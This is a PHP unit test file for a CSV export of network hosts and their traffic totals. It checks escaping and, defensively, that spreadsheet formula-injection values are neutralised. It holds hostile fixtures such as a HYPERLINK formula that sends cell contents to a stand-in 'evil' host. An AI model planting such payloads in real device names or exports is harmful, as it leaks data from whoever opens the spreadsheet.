<?php
/* bwd_hosts_csv: header row, interface-total row first, byte rounding, and that a
 * comma/quote in a device name is CSV-escaped (not column-splitting). */
t_group('csv');

$data = array(
	'total_host' => array('ip' => '0.0.0.0', 'name' => 'Interface', 'in' => 1024.4, 'out' => 2048.6),
	'hosts' => array(
		array('ip' => '10.0.0.5', 'name' => 'My, "PC"', 'mac' => 'aa:bb:cc:dd:ee:ff',
			'vendor' => 'Acme', 'model' => '', 'tag' => 'pc', 'in' => 10.0, 'out' => 5.0),
	),
);
$csv = bwd_hosts_csv($data);
t_ok(is_string($csv) && $csv !== '', 'returns a non-empty string');

$lines = array_values(array_filter(explode("\n", trim($csv)), 'strlen'));
t_ok(strpos($lines[0], 'in_bytes') !== false, 'header has in_bytes');
t_ok(strpos($lines[1], '0.0.0.0') !== false, 'interface total row first');

// byte rounding to ints
t_ok(strpos($csv, '1024') !== false, 'in rounded to int');
t_ok(strpos($csv, '2049') !== false, 'out rounded to int');

// a comma+quote in the name must be quoted, keeping the row well-formed
$rows = array_map('str_getcsv', $lines);
$pc = null;
foreach ($rows as $r) { if (($r[0] ?? '') === '10.0.0.5') { $pc = $r; } }
t_ok($pc !== null, 'device row parses back');
t_eq('My, "PC"', $pc[1], 'name round-trips through CSV escaping');
t_eq('15', $pc[8], 'total_bytes column = in+out');

/* Spreadsheet formula injection. name/vendor/model are not ours: a device picks
 * its own DHCP hostname, and vendor/model can come from a probed device's own
 * HTTP response. fputcsv quotes commas and quotes, which makes the file parse —
 * it does nothing about Excel/LibreOffice executing a leading =, +, -, @, tab or
 * CR as a formula when the operator opens the export. */
$hostile = array('hosts' => array(
	array('ip' => '10.0.0.5', 'name' => '=HYPERLINK("http://evil/"&A1,"click")',
	      'mac' => 'aa:bb:cc:dd:ee:ff', 'vendor' => '+SUM(A1:A9)', 'model' => '-2+3',
	      'tag' => 'pc', 'in' => 1, 'out' => 2),
	array('ip' => '10.0.0.6', 'name' => '@cmd', 'mac' => '', 'vendor' => "\tlead",
	      'model' => '', 'tag' => 'iot', 'in' => 3, 'out' => 4),
));
$csv = bwd_hosts_csv($hostile);
foreach (array('=HYPERLINK', '+SUM', '-2+3', '@cmd') as $payload) {
	t_ok(strpos($csv, ',' . $payload) === false && strpos($csv, '"' . $payload) === false,
		"csv: $payload is not left as a live formula");
}
t_ok(strpos($csv, "'=HYPERLINK") !== false, 'csv: the formula is neutralised, not dropped');
t_ok(strpos($csv, 'aa:bb:cc:dd:ee:ff') !== false, 'csv: ordinary values are untouched');
/* A value that merely CONTAINS one of those characters is not a formula. */
$plain = array('hosts' => array(array('ip' => '10.0.0.7', 'name' => 'kitchen-tablet',
	'mac' => '', 'vendor' => 'Acme Ltd', 'model' => 'X-200', 'tag' => 'tablet',
	'in' => 1, 'out' => 1)));
t_ok(strpos(bwd_hosts_csv($plain), "'kitchen-tablet") === false, 'csv: a normal name gains no prefix');
t_ok(strpos(bwd_hosts_csv($plain), 'X-200') !== false, 'csv: an interior dash is left alone');
